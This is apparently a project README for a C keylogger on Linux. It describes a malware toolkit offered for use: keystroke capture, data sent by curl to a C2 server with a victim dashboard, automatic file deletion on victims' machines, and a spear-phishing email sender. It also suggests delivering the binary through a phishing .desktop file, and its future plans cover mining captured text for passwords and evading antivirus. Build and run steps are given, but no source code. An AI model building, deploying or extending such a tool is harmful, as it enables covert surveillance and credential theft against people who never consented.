# Keylogger Implementation

## Overview

I implemented a basic solution for a keylogger in C using the POSIX API. The solution is meant to be tested on a Linux distribution. The keylogger runs in the background and captures keystrokes from a target system. 
I also created an interface for the attacker which has the following features:
- the option to send an email to a specific email address (simulates spear phishing) by customizing the field to, title and body so it makes the email more credible;
- the option to view the victims in a dashboard and by pressing on one of the to see the heartbeats sent to the backend. This is done using Google gateway for SMTP;
- in the backend, I used keycloak to evitate the unwanted interaction, but I let an endpoint for any person, this one is going to be called from the victim computer and on the first call it will be created the victim.
Front end is written in ReactJS framework and back end is written in Java Springboot

---

## Future work

- For server-side analysis of the received data, I will integrate a pattern-based search to identify potential credentials within the captured text. Additionally, a machine learning algorithm will be implemented to estimate the likelihood that specific character sequences are actual passwords. 

## Tasks to be Implemented

Here is a list of tasks for future development:

- [x] **Include the possibility to do requests to the C2 server (backend);**
- [x] **Use system to execute commands like `curl` for requests with data (keys pressed) to the server;**
- [x] **Create a backend in a high-level language so it can be easier to work with files;**
- [x] **Define actions for the keylogger that will be passed as responses for the requests initiated by the malware:**
    - [x] Send keys logged for a victim;
    - [x] Delete files automatically on the victim computer after the files are sent;
    - [x] Receive bulk data and save it in files for every victim.
- [ ] **Find a dataset to identify possible passwords in order to implement the ML-based algorithm;**
- [ ] **Find current implementations for algorithms dedicated for password recognition from a text;**
- [ ] **Evaluate the current keylogger level of exposure confronting with anti-virus solutions in Linux and further improve the solution to be harder to detect.**

---

## Requirements

- A Linux distribution (e.g., Ubuntu or CentOS)
- GCC compiler
- POSIX-compliant system

---

## How to Compile and Run

1. Clone the repository:

    ```bash
    git clone https://github.com/IonutCorbu/C_POSIX_Keylogger.git
    ```

2. Change to the project directory:

    ```bash
    cd C_POSIX_Keylogger
    ```

3. Compile the C code:

    ```bash
    gcc -o keylogger -lpthread keylogger.c
    ```

4. Run the keylogger:

    ```bash
    sudo ./keylogger
    ```

The keylogger will start capturing keystrokes and save them to the `/var/log/keylogger' directory.
A .desktop file can be used to deliver the keylogger via phishing attack.

---

## Notes

- Ensure you have the necessary permissions to run the keylogger on the target machine (as Linux requires root authority to capture keys pressed);
- You can modify the code to suit specific requirements or perform further actions with the captured data.
---

## Future Directions

- [x] Implement communication with a central server (C2) for real-time data transfer.
- [ ] Use machine learning algorithms to analyze the captured data for potential password identification.
